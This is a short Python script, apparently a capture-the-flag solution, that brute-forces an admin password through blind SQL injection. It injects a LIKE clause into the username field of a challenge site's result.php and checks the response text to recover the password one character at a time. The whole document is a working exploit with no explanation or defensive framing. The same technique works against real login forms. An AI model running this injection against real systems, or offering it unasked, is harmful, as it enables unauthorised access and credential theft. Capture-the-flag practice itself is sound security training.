from requests import *
from string import printable
url = "http://shell1.2019.peactf.com:57037/result.php"
good_response = "Your answer to the security question is not correct."
so_far = ''  
start = '3' 
for i in range(30):
    for x in printable:
        data = {'answer': 'a', 'debug': '1', 'username': "admin' AND password LIKE '"+start+so_far+x+"%"}
        re = post(url, data=data)
        if good_response in re.text:
            so_far += x
            print start+so_far
            break
        
    

